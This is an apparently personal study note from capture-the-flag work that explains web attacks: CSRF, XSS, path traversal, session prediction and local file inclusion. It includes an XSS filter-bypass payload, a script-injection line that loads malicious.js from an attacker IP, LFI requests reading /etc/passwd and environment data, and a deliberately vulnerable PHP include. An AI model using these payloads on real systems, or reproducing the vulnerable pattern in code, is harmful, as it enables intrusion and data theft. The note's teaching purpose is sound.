# Attacks

## Resources

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
  > A list of useful payloads and bypasses for Web Application Security (e.g. LFI payloads, XSS injection, CSRF injection, etc.)

## Terminology

### Cross Site Request Forgery (CSRF)

A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user.

CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.

CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.

### Cross Site Scripting (XSS)

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. Flaws that allow these attacks to succeed occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

* [XSS Filter Bypass Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
  * If no quotes of any kind are allowed you can use `eval()` and `fromCharCode()`. e.g.:<br/>
  `eval(String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,34,88,83,83,34,41));`<br/>
  which is equivalent to <br/>
  `javascript:alert("XSS");`
* [XSS Prevention techniques](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) for the developer

#### How to inject a payload?

1. Make the web server load a script from you. In other words, the XSS attack should inject the following (or similar) payload

    ```js
    document.write('script src="http://<your-ip>/malicious.js"</script>');
    ```

    In order to check if the web server even attempts to load your script, you can always run a netcat first with `-lvnp 80`.<br/>
    This method has the benefit that you need no further anti-sanitization for your actual malicious payloads. Anti-sanitization is required only to enter the above javascript code.

### Path Traversal

The Path Traversal attack technique allows an attacker access to files, directories, and commands that potentially reside outside the web document root directory. An attacker may manipulate a URL in such a way that the web site will execute or reveal the contents of arbitrary files anywhere on the web server. Any device that exposes an HTTP-based interface is potentially vulnerable to Path Traversal.

e.g. `https://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd`

Most web sites restrict user access to a specific portion of the file-system, typically called the "web document root" or "CGI root" directory. These directories contain the files intended for user access and the executable necessary to drive web application functionality. To access files or execute commands anywhere on the file-system, Path Traversal attacks will utilize the ability of special-characters sequences.

The most basic Path Traversal attack uses the `../` special-character sequence to alter the resource location requested in the URL. Although most popular web servers will prevent this technique from escaping the web document root, alternate encodings of the `../` sequence may help bypass the security filters. These method variations include valid and invalid Unicode-encoding (`..%u2216` or `..%c0%af`) of the forward slash character, backslash characters (`..\`) on Windows-based servers, URL encoded characters `%2e%2e%2f`), and double URL encoding (`..%255c`) of the backslash character.

Even if the web server properly restricts Path Traversal attempts in the URL path, a web application itself may still be vulnerable due to improper handling of user-supplied input. This is a common problem of web applications that use template mechanisms or <u>load static text from files</u>. 

In variations of the attack, the original URL parameter value is substituted with the file name of one of the web application's dynamic scripts. Consequently, the results can reveal source code because the file is interpreted as text instead of an executable script. These techniques often employ additional special characters such as the dot (`.`) to reveal the listing of the current working directory, or `%00` NULL characters in order to bypass rudimentary file extension checks.

### Session Prediction Attack

The [session prediction attack](https://owasp.org/www-community/attacks/Session_Prediction) focuses on predicting session ID values that permit an attacker to bypass the authentication schema of an application. By analyzing and understanding the session ID generation process, an attacker can predict a valid session ID value and get access to the application or impersonate another user (e.g. admin)

[Session Management CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) for developers
![session-management](https://cheatsheetseries.owasp.org/assets/Session_Management_Cheat_Sheet_Diagram.png)

See Natas level19 for an example

### Local File Inclusion (LFI) attacks

Local File Inclusion (LFI) allows an attacker to include files on a server through the web browser. This vulnerability exists when a web application includes a file without correctly sanitising the input, allowing and attacker to manipulate the input and inject path traversal characters and include other files from the web server.

#### Example of vulnerable PHP code to LFI attacks

```php
if(array_key_exists("file", $_REQUEST))
  include($_REQUEST["file"]);
else
  include("default.php");
```

Some examples of GET requests that can exploit this bug and dump arbitrary files are:

* `GET /index.php?file=../../../../etc/passwd` (Number of back directories (`../`) depend on the server )
* `GET /index.php?file=/etc/passwd`
* `GET /index.php?file=/proc/self/environ`
* `GET /index.php?file=/var/log/apache2/access.log`
* `GET /index.php?file=/var/log/apache2/log-with-malicious-PHP-code.log`
  * The malicious PHP code can be entered by the user with a previous HTTP request. Usually it is present in the headers

We can also use various [PHP Wrapper modules](https://www.php.net/manual/en/wrappers.php.php) to achieve more than just file dumping, like executing commands. Various PHP Wrappers used for the LFI purpose are:

* [Local File Inclusion (LFI) â€” Web Application Penetration Testing](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601) from Medium
* [OWASP Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) from OWASP
* [LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/) From HighOn.Coffee
* [PayloadsAllTheThings - LFI Chea Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) From the GitHub repository "PayloadsAllTheThings"
